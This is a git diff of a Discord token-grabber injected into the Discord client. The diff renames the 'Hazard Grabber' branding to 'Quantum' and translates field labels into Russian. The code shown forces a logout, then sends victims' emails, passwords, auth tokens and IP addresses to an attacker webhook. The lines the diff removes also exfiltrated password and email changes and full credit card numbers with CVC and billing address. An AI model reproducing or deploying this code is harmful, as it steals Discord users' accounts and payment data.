@@ -5,10 +5,10 @@ const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
+    if (!fs.existsSync(path.join(__dirname, "Quantum"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "Hazard"));
+    fs.rmdirSync(path.join(__dirname, "Quantum"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -127,20 +127,20 @@ function Login(email, password, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Quantum",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/920642469333438494/920643911775551518/quantum.png",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Account Info**",
-                                "value": `Email: ${email} - Password: ${password}`,
+                                "name": "**Информация об аккаунте**",
+                                "value": `Почта: ${email} - Пароль: ${password}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Token**",
+                                "name": "**Токен**",
                                 "value": `\`${token}\``,
                                 "inline": false
                             }
@@ -150,168 +150,7 @@ function Login(email, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                        }
-                    }
-                ]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
-    })
-}
-
-function ChangePassword(oldpassword, newpassword, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-            const json = JSON.parse(info);
-            var params = {
-                username: "Hazard Grabber",
-                content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
-                embeds: [
-                    {
-                        "color": 16507654,
-                        "fields": [
-                            {
-                                "name": "**Password Changed**",
-                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Token**",
-                                "value": `\`${token}\``,
-                                "inline": false
-                            }
-                        ],
-                        "author": {
-                            "name": json.username +"#" + json.discriminator + "・" + json.id,
-                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                        },
-                        "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                        }                 
-                    }
-                ]
-            }
-        SendToWebhook(JSON.stringify(params))
-        })
-    })
-}
-
-function ChangeEmail(newemail, password, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-            var params = {
-                username: "Hazard Grabber",
-                content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
-                embeds: [
-                    {
-                        "color": 16507654,
-                        "fields": [
-                            {
-                                "name": "**Email Changed**",
-                                "value": `New Email: ${newemail}\nPassword: ${password}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Token**",
-                                "value": `\`${token}\``,
-                                "inline": false
-                            }
-                        ],
-                        "author": {
-                            "name": json.username +"#" + json.discriminator + "・" + json.id,
-                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                        },
-                        "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                        }                
-                    }
-                ]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
-    })
-}
-
-function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-            var json = JSON.parse(info);
-            var params = {
-                username: "Hazard Grabber",
-                content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
-                embeds: [
-                    {
-                        "color": 16507654,
-                        "fields": [
-                            {
-                                "name": "**Credit Card Added**",
-                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Token**",
-                                "value": `\`${token}\``,
-                                "inline": false
-                            }
-                        ],
-                        "author": {
-                            "name": json.username + "#" + json.discriminator + "・" + json.id,
-                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                        },
-                        "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Quantum By Frenk#9800・https://github.com/TheFenk/"
                         }
                     }
                 ]
